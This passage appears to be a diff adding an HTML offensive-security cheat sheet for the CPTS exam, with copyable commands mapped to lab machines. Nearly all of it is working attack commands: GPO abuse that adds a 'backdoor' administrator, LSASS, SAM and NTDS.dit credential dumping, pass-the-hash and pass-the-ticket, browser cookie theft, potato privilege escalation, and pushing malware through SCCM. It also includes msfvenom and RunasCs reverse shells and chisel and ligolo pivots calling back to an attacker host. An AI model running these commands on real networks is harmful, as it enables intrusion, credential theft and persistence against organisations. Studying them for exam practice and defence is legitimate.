+<span class="cmd">net rpc password</span> "victim" "NewPass!" <span class="arg">-U "domain/attacker%pass" -S target</span>
+<span class="cmt"># AddMember — add ourselves to a privileged group</span>
+<span class="cmd">net rpc group addmem</span> "Domain Admins" "attacker" <span class="arg">-U "domain/attacker%pass" -S target</span>
+<span class="cmt"># PowerView</span>
+<span class="val">PS&gt;</span> <span class="cmd">Add-DomainGroupMember</span> -Identity 'Domain Admins' -Members 'attacker' -Credential $cred</pre>
+          </div>
+        </div>
+      </section>
+
+      <!-- GPO -->
+      <section class="section" id="gpo">
+        <div class="section-header"><h2>GPO / OU Abuse</h2><span class="tagline">4 machines</span></div>
+
+        <div class="card">
+          <div class="card-head"><div><h3>Push malicious GPO to OU</h3><div class="desc">If you have Write access to a GPO that applies to a target OU, you push a scheduled task / script</div></div><div class="machines"><span class="mach win">fluffy</span><span class="mach win">administrator</span></div><span class="chev">▸</span></div>
+          <div class="card-body">
+            <pre><button class="copy-btn">copy</button><span class="cmt"># Find writable GPOs in BloodHound</span>
+MATCH (u:User)-[:GenericAll|Writes|GenericWrite]->(g:GPO) RETURN u,g
+<span class="cmt"># Push immediate scheduled task via SharpGPOAbuse</span>
+<span class="val">PS&gt;</span> <span class="cmd">.\\SharpGPOAbuse.exe</span> --add-computer-task --taskname "Update" --author domain\\attacker --command "cmd.exe" --arguments "/c net user backdoor P@ss123! /add && net localgroup Administrators backdoor /add" --gpo-name "VULN_GPO"
+<span class="val">PS&gt;</span> <span class="cmd">gpupdate /force</span>   <span class="cmt"># on a target</span></pre>
+          </div>
+        </div>
+      </section>
+
+      <!-- LSASS -->
+      <section class="section" id="lsass">
+        <div class="section-header"><h2>LSASS Dumping</h2><span class="tagline">11 machines • the single most important cred-access action</span></div>
+
+        <div class="card">
+          <div class="card-head"><div><h3>Mimikatz sekurlsa::logonpasswords</h3><div class="desc">Dump NT hashes, Kerb tickets, passwords from LSASS memory</div></div><div class="machines"><span class="mach win">jeeves</span><span class="mach win">streamio</span><span class="mach win">hospital</span><span class="mach win">administrator</span></div><span class="chev">▸</span></div>
+          <div class="card-body">
+            <div class="step"><span class="step-num">1</span><span class="step-title">Need local admin + SeDebugPrivilege</span>
+              <pre><button class="copy-btn">copy</button>mimikatz# <span class="cmd">privilege::debug</span>
+mimikatz# <span class="cmd">sekurlsa::logonpasswords</span>
+mimikatz# <span class="cmd">sekurlsa::tickets</span> /export   <span class="cmt"># export tickets</span></pre>
+            </div>
+            <div class="step"><span class="step-num">2</span><span class="step-title">Without mimikatz — taskmgr / procdump / comsvcs</span>
+              <pre><button class="copy-btn">copy</button><span class="cmt"># Using rundll32 + comsvcs.dll (no binary on disk)</span>
+<span class="val">PS&gt;</span> <span class="cmd">rundll32</span> C:\Windows\System32\comsvcs.dll, MiniDump &lt;lsass_pid&gt; C:\temp\lsass.dmp full
+<span class="cmt"># Or via procdump (Sysinternals, signed)</span>
+<span class="val">PS&gt;</span> <span class="cmd">procdump.exe</span> -accepteula -ma lsass.exe lsass.dmp
+<span class="cmt"># Parse offline with pypykatz</span>
+<span class="cmd">pypykatz</span> lsa minidump lsass.dmp</pre>
+              <div class="warn-note"><b>OpSec:</b> LSASS dumping is loud. On the exam, prefer <code class="inline">nanodump</code> or <code class="inline">SilkETW</code>-aware methods. Always use a signed binary where possible.</div>
+            </div>
+          </div>
+        </div>
+      </section>
+
+      <!-- NTDS -->
+      <section class="section" id="ntds">
+        <div class="section-header"><h2>NTDS.dit Extraction</h2><span class="tagline">6 machines</span></div>
+
+        <div class="card">
+          <div class="card-head"><div><h3>Dump NTDS.dit on the DC</h3><div class="desc">Every password hash in the domain. Requires Domain Admin or local admin on DC.</div></div><div class="machines"><span class="mach win">forest</span><span class="mach win">administrator</span><span class="mach win">vintage</span></div><span class="chev">▸</span></div>
+          <div class="card-body">
+            <pre><button class="copy-btn">copy</button><span class="cmt"># Easiest — secretsdump as DA</span>
+<span class="cmd">secretsdump.py</span> <span class="val">domain/admin:pass@dc_ip</span> <span class="arg">-just-dc-ntlm</span>
+<span class="cmt"># Via Volume Shadow Copy on DC</span>
+<span class="val">PS&gt;</span> <span class="cmd">vssadmin</span> create shadow /for=C:
+<span class="val">PS&gt;</span> <span class="cmd">copy</span> \\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy1\\Windows\\NTDS\\ntds.dit C:\\temp\\ntds.dit
+<span class="val">PS&gt;</span> <span class="cmd">copy</span> \\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy1\\Windows\\System32\\config\\SYSTEM C:\\temp\\SYSTEM
+<span class="val">PS&gt;</span> <span class="cmd">vssadmin</span> delete shadows /shadow={...} /quiet
+<span class="cmt"># Parse locally</span>
+<span class="cmd">secretsdump.py</span> <span class="arg">-ntds ntds.dit -system SYSTEM LOCAL</span></pre>
+          </div>
+        </div>
+      </section>
+
+      <!-- SAM -->
+      <section class="section" id="sam">
+        <div class="section-header"><h2>SAM / LSA Secrets</h2><span class="tagline">5 machines</span></div>
+
+        <div class="card">
+          <div class="card-head"><div><h3>Dump local SAM database</h3><div class="desc">Local account NT hashes — useful for the initial foothold host</div></div><div class="machines"><span class="mach win">streamio</span><span class="mach win">pov</span><span class="mach win">ghost</span></div><span class="chev">▸</span></div>
+          <div class="card-body">
+            <pre><button class="copy-btn">copy</button><span class="cmt"># Mimikatz</span>
+mimikatz# <span class="cmd">lsadump::sam</span>
+<span class="cmt"># secretsdump remote</span>
+<span class="cmd">secretsdump.py</span> <span class="arg">-sam SAM -system SYSTEM LOCAL</span>
+<span class="cmt"># reg save (no external tools)</span>
+<span class="val">PS&gt;</span> <span class="cmd">reg</span> save HKLM\\SAM C:\\temp\\SAM
+<span class="val">PS&gt;</span> <span class="cmd">reg</span> save HKLM\\SYSTEM C:\\temp\\SYSTEM
+<span class="cmt"># Or via Evil-WinRM</span>
+<span class="val">PS&gt;</span> <span class="cmd">Invoke-Binary</span> /path/to/SafetyDump.exe
+<span class="val">PS&gt;</span> <span class="cmd">Get-BootKey</span>; <span class="cmd">Get-Hashes</span></pre>
+          </div>
+        </div>
+      </section>
+
+      <!-- PTH -->
+      <section class="section" id="pth">
+        <div class="section-header"><h2>Pass-the-Hash / Pass-the-Ticket</h2><span class="tagline">12 machines • the bread and butter of lateral movement</span></div>
+
+        <div class="card">
+          <div class="card-head"><div><h3>PTH with Impacket (psexec/wmiexec/smbexec/atexec)</h3><div class="desc">Use NT hash instead of password — no need to crack it</div></div><div class="machines"><span class="mach win">jeeves</span><span class="mach win">administrator</span><span class="mach win">vintage</span><span class="mach win">forest</span></div><span class="chev">▸</span></div>
+          <div class="card-body">
+            <pre><button class="copy-btn">copy</button><span class="cmd">crackmapexec smb</span> <span class="val">target</span> <span class="arg">-u user -H aad3b435b51404eeaad3b435b51404ee:&lt;NT_HASH&gt;</span>
+<span class="cmd">psexec.py</span> <span class="arg">-hashes :&lt;NT_HASH&gt; domain/user@target</span>
+<span class="cmd">wmiexec.py</span> <span class="arg">-hashes :&lt;NT_HASH&gt; domain/user@target</span>
+<span class="cmd">smbexec.py</span> <span class="arg">-hashes :&lt;NT_HASH&gt; domain/user@target</span>
+<span class="cmd">atexec.py</span> <span class="arg">-hashes :&lt;NT_HASH&gt; domain/user@target 'whoami'</span>
+<span class="cmt"># Evil-WinRM with hash</span>
+<span class="cmd">evil-winrm</span> <span class="arg">-i target -u user -H &lt;NT_HASH&gt;</span></pre>
+            <div class="note"><b>Jeeves</b> ended with PTH to local Administrator hash on the box → <code class="inline">psexec.py</code> as SYSTEM. <b>Administrator</b> involved PTH all the way to DA.</div>
+          </div>
+        </div>
+
+        <div class="card">
+          <div class="card-head"><div><h3>Pass-the-Ticket (Kirbi → use)</h3><div class="desc">Inject TGT/TGS into current session — no password needed</div></div><div class="machines"><span class="mach win">vintage</span><span class="mach win">snoopy</span><span class="mach win">tombwatcher</span></div><span class="chev">▸</span></div>
+          <div class="card-body">
+            <pre><button class="copy-btn">copy</button><span class="cmt"># Linux → Windows cross-trust via ccache</span>
+<span class="cmd">export</span> KRB5CCNAME=user.ccache
+<span class="cmd">psexec.py</span> <span class="arg">-k -no-pass domain/user@target_fqdn</span>
+<span class="cmd">wmiexec.py</span> <span class="arg">-k -no-pass domain/user@target_fqdn</span>
+<span class="cmt"># Windows — Rubeus</span>
+<span class="val">PS&gt;</span> <span class="cmd">.\\Rubeus.exe</span> ptt /ticket:base64...
+<span class="val">PS&gt;</span> <span class="cmd">klist</span>   <span class="cmt"># verify</span></pre>
+          </div>
+        </div>
+
+        <div class="card">
+          <div class="card-head"><div><h3>Overpass-the-Hash (NT hash → TGT)</h3><div class="desc">Convert NT hash into a Kerberos TGT for Kerb-only services</div></div><div class="machines"><span class="mach win">administrator</span><span class="mach win">vintage</span></div><span class="chev">▸</span></div>
+          <div class="card-body">
+            <pre><button class="copy-btn">copy</button><span class="cmt"># Rubeus — request TGT using NT hash</span>
+<span class="val">PS&gt;</span> <span class="cmd">.\\Rubeus.exe</span> asktgt /user:Administrator /rc4:&lt;NT_HASH&gt; /ptt
+<span class="cmt"># Impacket getTGT</span>
+<span class="cmd">getTGT.py</span> <span class="arg">-hashes :&lt;NT_HASH&gt; domain/user@dc</span></pre>
+          </div>
+        </div>
+      </section>
+
+      <!-- DPAPI -->
+      <section class="section" id="dpapi">
+        <div class="section-header"><h2>DPAPI / Vault / Browser Creds</h2><span class="tagline">3 machines</span></div>
+
+        <div class="card">
+          <div class="card-head"><div><h3>Decrypt saved browser & app credentials</h3><div class="desc">DPAPI blobs in AppData can be decrypted with user's password or master key</div></div><div class="machines"><span class="mach win">streamio</span><span class="mach win">pov</span><span class="mach win">whiterabbit</span></div><span class="chev">▸</span></div>
+          <div class="card-body">
+            <pre><button class="copy-btn">copy</button><span class="cmt"># Evil-WinRM DPAPI module</span>
+<span class="val">PS&gt;</span> <span class="cmd">Invoke-Mimikatz</span> -Command '"dpapi::masterkey /in:C:\\path\\to\\masterkey /password:pass"'
+<span class="cmt"># SharpChromium</span>
+<span class="val">PS&gt;</span> <span class="cmd">.\\SharpChromium.exe</span> cookies /browser:chrome
+<span class="cmt"># Lapdump — LAPS password</span>
+<span class="cmd">crackmapexec ldap</span> <span class="val">dc</span> <span class="arg">-u user -p pass -M laps</span></pre>
+          </div>
+        </div>
+      </section>
+
+      <!-- WIN PRIVESC -->
+      <section class="section" id="win-privesc">
+        <div class="section-header"><h2>Windows Privilege Escalation</h2><span class="tagline">14 machines</span></div>
+
+        <div class="card">
+          <div class="card-head"><div><h3>Token privileges — SeImpersonate, SeDebug, SeBackup, SeAssignPrimary</h3><div class="desc">Run <code class="inline">whoami /priv</code> first on every shell</div></div><div class="machines"><span class="mach win">jeeves</span><span class="mach win">pov</span><span class="mach win">streamio</span><span class="mach win">hospital</span><span class="mach win">ghost</span></div><span class="chev">▸</span></div>
+          <div class="card-body">
+            <pre><button class="copy-btn">copy</button><span class="val">PS&gt;</span> <span class="cmd">whoami</span> /priv
+<span class="val">PS&gt;</span> <span class="cmd">whoami</span> /groups</pre>
+            <div class="note"><b>SeImpersonate</b> → PrintSpoofer / GodPotato / RoguePotato. <b>SeDebug</b> → migrate to SYSTEM process. <b>SeBackup</b> → read SAM/SYSTEM/NTDS. <b>SeRestore</b> → write privileged files. <b>SeTakeOwnership</b> → take ownership of files.</div>
+          </div>
+        </div>
+
+        <div class="card">
+          <div class="card-head"><div><h3>Unquoted service paths & writable services</h3><div class="desc">Classic CPTS priv esc — find services with unquoted paths or weak ACLs</div></div><div class="machines"><span class="mach win">pov</span><span class="mach win">hospital</span></div><span class="chev">▸</span></div>
+          <div class="card-body">
+            <pre><button class="copy-btn">copy</button><span class="val">PS&gt;</span> <span class="cmd">wmic</span> service get name,displayname,pathname,startmode <span class="pipe">|</span> findstr /i "auto" <span class="pipe">|</span> findstr /i /v "c:\windows"
+<span class="val">PS&gt;</span> <span class="cmd">Get-WmiObject</span> win32_service <span class="pipe">|</span> Select-Object name,pathname <span class="pipe">|</span> Where-Object {$_.pathname -notmatch "C:\\Windows"}
+<span class="cmt"># Check service ACLs with PowerUp</span>
+<span class="val">PS&gt;</span> <span class="cmd">Invoke-AllChecks</span>
+<span class="val">PS&gt;</span> <span class="cmd">Get-ModifiableService</span>
+<span class="val">PS&gt;</span> <span class="cmd">Invoke-ServiceAbuse</span> -Name 'vuln_svc' -Command 'net user backdoor P@ss! /add'</pre>
+          </div>
+        </div>
+
+        <div class="card">
+          <div class="card-head"><div><h3>AlwaysInstallElevated</h3><div class="desc">MSI packages run as SYSTEM if this registry key is set</div></div><div class="machines"><span class="mach win">streamio</span><span class="mach win">ghost</span></div><span class="chev">▸</span></div>
+          <div class="card-body">
+            <pre><button class="copy-btn">copy</button><span class="val">PS&gt;</span> <span class="cmd">reg</span> query HKCU\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated
+<span class="val">PS&gt;</span> <span class="cmd">reg</span> query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated
+<span class="cmt"># Generate malicious MSI</span>
+<span class="cmd">msfvenom</span> <span class="arg">-p windows/x64/shell_reverse_tcp LHOST=x LPORT=y -f msi -o rev.msi</span>
+<span class="val">PS&gt;</span> <span class="cmd">msiexec</span> /quiet /qn /i C:\\temp\\rev.msi</pre>
+          </div>
+        </div>
+
+        <div class="card">
+          <div class="card-head"><div><h3>Scheduled tasks & autoruns</h3><div class="desc">Find tasks running as SYSTEM pointing to writable paths</div></div><div class="machines"><span class="mach win">administrator</span><span class="mach win">hospital</span></div><span class="chev">▸</span></div>
+          <div class="card-body">
+            <pre><button class="copy-btn">copy</button><span class="val">PS&gt;</span> <span class="cmd">Get-ScheduledTask</span> <span class="pipe">|</span> Where-Object State -eq 'Ready' <span class="pipe">|</span> Select-Object TaskName,TaskPath,State
+<span class="val">PS&gt;</span> <span class="cmd">schtasks</span> /query /fo LIST /v <span class="pipe">|</span> findstr /i "TaskName RunAs"
+<span class="cmt"># Check autoruns</span>
+<span class="val">PS&gt;</span> <span class="cmd">Get-CimInstance</span> Win32_StartupCommand <span class="pipe">|</span> Select-Object Name,command,Location</pre>
+          </div>
+        </div>
+      </section>
+
+      <!-- LINUX PRIVESC -->
+      <section class="section" id="linux-privesc">
+        <div class="section-header"><h2>Linux Privilege Escalation</h2><span class="tagline">6 machines</span></div>
+
+        <div class="card">
+          <div class="card-head"><div><h3>Sudo / SUID / Capabilities / Cron</h3><div class="desc">Standard Linux escalation paths</div></div><div class="machines"><span class="mach linux">trick</span><span class="mach linux">postman</span><span class="mach linux">craft</span><span class="mach linux">hospital(linux)</span></div><span class="chev">▸</span></div>
+          <div class="card-body">
+            <pre><button class="copy-btn">copy</button><span class="cmd">sudo</span> -l
+<span class="cmd">find</span> / -perm -4000 -type f 2&gt;/dev/null      <span class="cmt"># SUID</span>
+<span class="cmd">getcap</span> -r / 2&gt;/dev/null                       <span class="cmt"># capabilities</span>
+<span class="cmd">cat</span> /etc/crontab; <span class="cmd">ls</span> -la /etc/cron.*
+<span class="cmd">linpeas.sh</span>                                  <span class="cmt"># automated</span>
+<span class="cmd">pspy64</span>                                      <span class="cmt"># watch processes</span>
+<span class="cmt"># Kernel exploits (last resort)</span>
+<span class="cmd">uname</span> -a; <span class="cmd">searchsploit</span> linux kernel &lt;version&gt;</pre>
+            <div class="note"><b>Postman</b>: Redis misconfig → SSH key injection → webmin exploit. <b>Craft</b>: Flask debug + Vault token. <b>Trick</b>: sudo tricks + Nginx path traversal.</div>
+          </div>
+        </div>
+      </section>
+
+      <!-- SEIMPERSONATE -->
+      <section class="section" id="seimpersonate">
+        <div class="section-header"><h2>SeImpersonate / Potato Family</h2><span class="tagline">7 machines</span></div>
+
+        <div class="card">
+          <div class="card-head"><div><h3>Potato exploits — PrintSpoofer, GodPotato, RoguePotato, JuicyPotato</h3><div class="desc">Force SYSTEM to authenticate to you, capture its token, impersonate it</div></div><div class="machines"><span class="mach win">jeeves</span><span class="mach win">pov</span><span class="mach win">streamio</span><span class="mach win">hospital</span></div><span class="chev">▸</span></div>
+          <div class="card-body">
+            <pre><button class="copy-btn">copy</button><span class="cmt"># PrintSpoofer — works on Server 2019 / Win10</span>
+<span class="val">PS&gt;</span> <span class="cmd">.\\PrintSpoofer.exe</span> -i -c "cmd.exe"
+<span class="val">PS&gt;</span> <span class="cmd">.\\PrintSpoofer.exe</span> -c "C:\\temp\\rev.exe"
+<span class="cmt"># GodPotato — works on older + newer</span>
+<span class="val">PS&gt;</span> <span class="cmd">.\\GodPotato.exe</span> -cmd "cmd /c C:\\temp\\rev.exe"
+<span class="cmt"># RoguePotato — needs SMB listener on attacker</span>
+<span class="val">PS&gt;</span> <span class="cmd">.\\RoguePotato.exe</span> --rhost attacker --rport 135 --lsport 9999 -e "C:\\temp\\rev.exe"</pre>
+            <div class="warn-note">Choose the potato based on Windows version: <b>JuicyPotato</b> ≤ Server 2016, <b>PrintSpoofer</b> ≤ Server 2019, <b>GodPotato/CoercedPotato</b> ≤ Server 2022.</div>
+          </div>
+        </div>
+      </section>
+
+      <!-- SCCM -->
+      <section class="section" id="sccm">
+        <div class="section-header"><h2>SCCM / MECM Abuse</h2><span class="tagline">3 machines • a CPTS specialty</span></div>
+
+        <div class="card">
+          <div class="card-head"><div><h3>SCCM site server takeover</h3><div class="desc">If you compromise the SCCM server (or NAA), you push software to every client → SYSTEM on all</div></div><div class="machines"><span class="mach win">authority</span><span class="mach win">vintage</span><span class="mach win">tombwatcher</span></div><span class="chev">▸</span></div>
+          <div class="card-body">
+            <pre><button class="copy-btn">copy</button><span class="cmt"># Enumerate SCCM via sccmhunter</span>
+<span class="cmd">python3</span> <span class="val">sccmhunter.py</span> find <span class="arg">-u user -p pass -d domain.local -dc-ip dc</span>
+<span class="cmd">python3</span> <span class="val">sccmhunter.py</span> smb <span class="arg">-u user -p pass -d domain.local -dc-ip dc -target sccm_fqdn</span>
+<span class="cmt"># Dump NAA (Network Access Account) creds</span>
+<span class="cmd">python3</span> <span class="val">sccmhunter.py</span> naa <span class="arg">-u user -p pass -d domain.local -dc-ip dc</span>
+<span class="cmt"># Push malicious app to clients</span>
+<span class="val">PS&gt;</span> <span class="cmd">.\\SharpSCCM.exe</span> exec -r attacker 4444 -s</pre>
+            <div class="note">On <b>Authority</b>, full SCCM compromise allowed pushing malware to all clients → SYSTEM across the fleet.</div>
+          </div>
+        </div>
+      </section>
+
+      <!-- LATERAL -->
+      <section class="section" id="lateral">
+        <div class="section-header"><h2>Lateral Movement</h2><span class="tagline">15 machines</span></div>
+
+        <div class="card">
+          <div class="card-head"><div><h3>WinRM / WMI / PSExec / DCOM</h3><div class="desc">Multiple ways to execute code on remote hosts with valid creds</div></div><div class="machines"><span class="mach win">jeeves</span><span class="mach win">streamio</span><span class="mach win">administrator</span><span class="mach win">hospital</span></div><span class="chev">▸</span></div>
+          <div class="card-body">
+            <pre><button class="copy-btn">copy</button><span class="cmt"># Evil-WinRM</span>
+<span class="cmd">evil-winrm</span> <span class="arg">-i target -u user -p pass</span>
+<span class="cmd">evil-winrm</span> <span class="arg">-i target -u user -H &lt;NT_HASH&gt;</span>
+<span class="cmt"># PowerShell remoting</span>
+<span class="val">PS&gt;</span> <span class="cmd">$s</span> = New-PSSession -ComputerName target -Credential $cred
+<span class="val">PS&gt;</span> <span class="cmd">Enter-PSSession</span> $s
+<span class="cmt"># WMI</span>
+<span class="val">PS&gt;</span> <span class="cmd">Invoke-WmiMethod</span> -ComputerName target -Class Win32_Process -Name Create -ArgumentList "cmd /c rev.exe" -Credential $cred
+<span class="cmt"># DCOM</span>
+<span class="val">PS&gt;</span> <span class="cmd">$d</span> = [activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application","target"))
+<span class="val">PS&gt;</span> $d.Document.ActiveView.ExecuteShellCommand("cmd",$null,"/c rev.exe","7")
+<span class="cmt"># PSExec</span>
+<span class="cmd">psexec.py</span> <span class="val">domain/user:pass@target</span>
+<span class="cmd">python3</span> <span class="val">psexec.py</span> <span class="arg">-hashes :&lt;NT_HASH&gt; domain/user@target</span></pre>
+          </div>
+        </div>
+
+        <div class="card">
+          <div class="card-head"><div><h3>RunAsCS / MakeToken / Inline execution</h3><div class="desc">Run commands as another user without dropping your current shell</div></div><div class="machines"><span class="mach win">pov</span><span class="mach win">administrator</span><span class="mach win">hospital</span></div><span class="chev">▸</span></div>
+          <div class="card-body">
+            <pre><button class="copy-btn">copy</button><span class="cmt"># RunAsCS — run as another user, useful for lateral to AD</span>
+<span class="val">PS&gt;</span> <span class="cmd">.\\RunasCs.exe</span> user pass cmd.exe -r 10.10.14.x:4444
+<span class="cmt"># MakeToken (Cobalt Strike style)</span>
+<span class="val">PS&gt;</span> <span class="cmd">.\\make_token.exe</span> DOMAIN\\user pass
+<span class="cmt"># Invoke-Command</span>
+<span class="val">PS&gt;</span> <span class="cmd">Invoke-Command</span> -ComputerName target -Credential $cred -ScriptBlock { whoami }</pre>
+          </div>
+        </div>
+      </section>
+
+      <!-- PIVOT -->
+      <section class="section" id="pivot">
+        <div class="section-header"><h2>Tunneling & Pivoting</h2><span class="tagline">10 machines • ligolo, chisel, ssh, proxychains</span></div>
+
+        <div class="card">
+          <div class="card-head"><div><h3>Ligolo-ng — modern TUN-based pivot</h3><div class="desc">Fastest, easiest pivot tool. Creates virtual interface on attacker.</div></div><div class="machines"><span class="mach win">hospital</span><span class="mach win">administrator</span><span class="mach win">tombwatcher</span><span class="mach win">whiterabbit</span></div><span class="chev">▸</span></div>
+          <div class="card-body">
+            <div class="step"><span class="step-num">1</span><span class="step-title">Run ligolo proxy on attacker</span>
+              <pre><button class="copy-btn">copy</button><span class="cmd">./proxy</span> <span class="arg">-selfcert -laddr 0.0.0.0:9001</span></pre>
+            </div>
+            <div class="step"><span class="step-num">2</span><span class="step-title">Run ligolo agent on target (Windows or Linux)</span>
+              <pre><button class="copy-btn">copy</button><span class="val">PS&gt;</span> <span class="cmd">.\\agent.exe</span> <span class="arg">-connect attacker:9001 -ignore-cert</span></pre>
+            </div>
+            <div class="step"><span class="step-num">3</span><span class="step-title">Add route and use</span>
+              <pre><button class="copy-btn">copy</button>ligolo&gt; <span class="cmd">ifconfig</span>    <span class="cmt"># add tunnel interface</span>
+ligolo&gt; <span class="cmd">start</span>       <span class="cmt"># routes traffic</span>
+<span class="cmt"># Now you can reach 10.10.11.0/24 directly from attacker</span>
+<span class="cmd">nmap</span> -sT -Pn <span class="val">10.10.11.x</span></pre>
+            </div>
+          </div>
+        </div>
+
+        <div class="card">
+          <div class="card-head"><div><h3>Chisel — TCP/UDP reverse SOCKS</h3><div class="desc">Older but reliable — SOCKS5 proxy through compromised host</div></div><div class="machines"><span class="mach win">streamio</span><span class="mach win">hospital</span></div><span class="chev">▸</span></div>
+          <div class="card-body">
+            <pre><button class="copy-btn">copy</button><span class="cmt"># Attacker (server)</span>
+<span class="cmd">./chisel</span> <span class="arg">server -p 8000 -reverse</span>
+<span class="cmt"># Target (client)</span>
+<span class="val">PS&gt;</span> <span class="cmd">.\\chisel.exe</span> <span class="arg">client attacker:8000 R:socks</span>
+<span class="cmt"># Use via proxychains</span>
+<span class="cmd">proxychains nmap</span> -sT -Pn <span class="val">10.10.11.0/24</span>
+<span class="cmd">proxychains crackmapexec smb</span> <span class="val">10.10.11.0/24</span></pre>
+          </div>
+        </div>
+
+        <div class="card">
+          <div class="card-head"><div><h3>SSH port forwarding</h3><div class="desc">Quick local/remote forwards when SSH is available</div></div><div class="machines"><span class="mach linux">trick</span><span class="mach linux">postman</span><span class="mach linux">hospital(linux)</span></div><span class="chev">▸</span></div>
+          <div class="card-body">
+            <pre><button class="copy-btn">copy</button><span class="cmt"># Local port forward (expose remote service on local port)</span>
+<span class="cmd">ssh</span> <span class="arg">-L 8080:127.0.0.1:80 user@target</span>
+<span class="cmt"># Remote port forward (expose local service to remote)</span>
+<span class="cmd">ssh</span> <span class="arg">-R 9090:127.0.0.1:8080 user@target</span>
+<span class="cmt"># Dynamic SOCKS proxy</span>
+<span class="cmd">ssh</span> <span class="arg">-D 1080 user@target</span></pre>
+          </div>
+        </div>
+      </section>
+
+      <!-- TOOLS -->
+      <section class="section" id="tools">
+        <div class="section-header"><h2>All Tools</h2><span class="tagline">Complete CPTS toolkit</span></div>
+
+        <div class="side-title" style="padding-left:0">Recon & Enumeration</div>
+        <div class="tools-grid">
+          <div class="tool"><div class="tname">nmap</div><div class="tdesc">Port scan + scripts</div></div>
+          <div class="tool"><div class="tname">masscan</div><div class="tdesc">Fast port sweep</div></div>
+          <div class="tool"><div class="tname">rustscan</div><div class="tdesc">Fast all-ports scan</div></div>
+          <div class="tool"><div class="tname">smbclient</div><div class="tdesc">SMB share access</div></div>
+          <div class="tool"><div class="tname">smbmap</div><div class="tdesc">SMB share mapper</div></div>
+          <div class="tool"><div class="tname">crackmapexec</div><div class="tdesc">Swiss army knife</div></div>
+          <div class="tool"><div class="tname">netexec</div><div class="tdesc">Modern CME fork</div></div>
+          <div class="tool"><div class="tname">ldapsearch</div><div class="tdesc">LDAP queries</div></div>
+          <div class="tool"><div class="tname">windapsearch</div><div class="tdesc">AD LDAP helper</div></div>
+          <div class="tool"><div class="tname">bloodhound-python</div><div class="tdesc">AD graph collector</div></div>
+          <div class="tool"><div class="tname">SharpHound</div><div class="tdesc">Windows collector</div></div>
+          <div class="tool"><div class="tname">dnsenum / dnsrecon</div><div class="tdesc">DNS recon</div></div>
+          <div class="tool"><div class="tname">feroxbuster</div><div class="tdesc">Recursive web fuzz</div></div>
+          <div class="tool"><div class="tname">gobuster</div><div class="tdesc">Dir/vhost brute</div></div>
+          <div class="tool"><div class="tname">ffuf</div><div class="tdesc">Fast web fuzzer</div></div>
+          <div class="tool"><div class="tname">whatweb</div><div class="tdesc">Tech fingerprint</div></div>
+          <div class="tool"><div class="tname">snmpwalk</div><div class="tdesc">SNMP enumeration</div></div>
+          <div class="tool"><div class="tname">kerbrute</div><div class="tdesc">User enumeration</div></div>
+        </div>
+
+        <div class="side-title" style="padding-left:0">Exploitation & AD Attacks</div>
+        <div class="tools-grid">
+          <div class="tool"><div class="tname">impacket suite</div><div class="tdesc">GetNPUsers, GetUserSPNs, secretsdump, psexec, wmiexec, smbexec, atexec, getST, findDelegation, rbcd, addcomputer, setspn</div></div>
+          <div class="tool"><div class="tname">certipy</div><div class="tdesc">ADCS attacks ESC1-15</div></div>
+          <div class="tool"><div class="tname">mimikatz</div><div class="tdesc">LSASS / Kerb / DPAPI</div></div>
+          <div class="tool"><div class="tname">Rubeus</div><div class="tdesc">Windows Kerb toolkit</div></div>
+          <div class="tool"><div class="tname">PowerView / SharpView</div><div class="tdesc">AD enumeration</div></div>
+          <div class="tool"><div class="tname">PowerUp</div><div class="tdesc">Windows privesc</div></div>
+          <div class="tool"><div class="tname">BloodHound</div><div class="tdesc">AD attack path GUI</div></div>
+          <div class="tool"><div class="tname">PetitPotam</div><div class="tdesc">Printerbug / coerce</div></div>
+          <div class="tool"><div class="tname">krbrelayx</div><div class="tdesc">Kerberos relay</div></div>
+          <div class="tool"><div class="tname">Coercer</div><div class="tdesc">Auto-coerce auth</div></div>
+          <div class="tool"><div class="tname">SharpGPOAbuse</div><div class="tdesc">GPO attacks</div></div>
+          <div class="tool"><div class="tname">sccmhunter</div><div class="tdesc">SCCM exploitation</div></div>
+          <div class="tool"><div class="tname">SharpSCCM</div><div class="tdesc">SCCM exec</div></div>
+        </div>
+
+        <div class="side-title" style="padding-left:0">Privesc & Shells</div>
+        <div class="tools-grid">
+          <div class="tool"><div class="tname">PrintSpoofer</div><div class="tdesc">SeImpersonate</div></div>
+          <div class="tool"><div class="tname">GodPotato</div><div class="tdesc">SeImpersonate</div></div>
+          <div class="tool"><div class="tname">RoguePotato</div><div class="tdesc">SeImpersonate</div></div>
+          <div class="tool"><div class="tname">JuicyPotato</div><div class="tdesc">SeImpersonate ≤2016</div></div>
+          <div class="tool"><div class="tname">RunasCs</div><div class="tdesc">Run as another user</div></div>
+          <div class="tool"><div class="tname">evil-winrm</div><div class="tdesc">WinRM shell</div></div>
+          <div class="tool"><div class="tname">linpeas / winpeas</div><div class="tdesc">Auto privesc enum</div></div>
+          <div class="tool"><div class="tname">pspy</div><div class="tdesc">Linux proc watcher</div></div>
+          <div class="tool"><div class="tname">nanodump</div><div class="tdesc">Silent LSASS dump</div></div>
+          <div class="tool"><div class="tname">pypykatz</div><div class="tdesc">Parse LSASS dumps</div></div>
+        </div>
+
+        <div class="side-title" style="padding-left:0">Pivoting & Misc</div>
+        <div class="tools-grid">
+          <div class="tool"><div class="tname">ligolo-ng</div><div class="tdesc">TUN-based pivot</div></div>
+          <div class="tool"><div class="tname">chisel</div><div class="tdesc">SOCKS pivot</div></div>
+          <div class="tool"><div class="tname">proxychains</div><div class="tdesc">Route via SOCKS</div></div>
+          <div class="tool"><div class="tname">socat</div><div class="tdesc">Port forwarder</div></div>
+          <div class="tool"><div class="tname">hashcat</div><div class="tdesc">Hash cracking</div></div>
+          <div class="tool"><div class="tname">john</div><div class="tdesc">Hash cracking</div></div>
+          <div class="tool"><div class="tname">responder</div><div class="tdesc">LLMNR/NBT-NS poison</div></div>
+          <div class="tool"><div class="tname">ntlmrelayx</div><div class="tdesc">NTLM relay</div></div>
+          <div class="tool"><div class="tname">sqlmap</div><div class="tdesc">SQLi automation</div></div>
+          <div class="tool"><div class="tname">wfuzz</div><div class="tdesc">Web fuzzer</div></div>
+        </div>
+      </section>
+
+      <!-- MACHINE INDEX -->
+      <section class="section" id="machines">
+        <div class="section-header"><h2>Machine Index</h2><span class="tagline">23 machines → key attack chains</span></div>
+
+        <div class="card">
